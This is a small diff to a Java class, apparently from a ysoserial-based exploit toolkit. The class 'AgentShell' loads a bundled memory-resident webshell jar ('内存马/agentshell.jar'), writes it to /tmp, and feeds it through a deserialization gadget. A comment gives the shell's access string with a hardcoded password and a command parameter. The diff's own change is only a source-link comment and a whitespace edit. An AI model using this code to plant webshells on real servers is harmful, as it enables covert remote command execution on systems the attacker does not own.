@@ -7,6 +7,7 @@ import ysoserial.payloads.util.JavaCompiler;
 import ysoserial.payloads.util.ReadWrite;
 
 // ?password=1nhann&cmd=id
+//https://github.com/1nhann/agentshell_jar
 public class AgentShell {
     public static void main(String[] args) {
 
@@ -20,7 +21,7 @@ public class AgentShell {
         Object o = new Eval().getObject(gadget,c);
         return o;
     }
-
+    
     public Object getObject(Class gadget) throws Exception {
         String jarPath = "/tmp/1nhann.jar";
         byte[] jarContent = ReadWrite.readResource(AgentShell.class,"内存马/agentshell.jar");
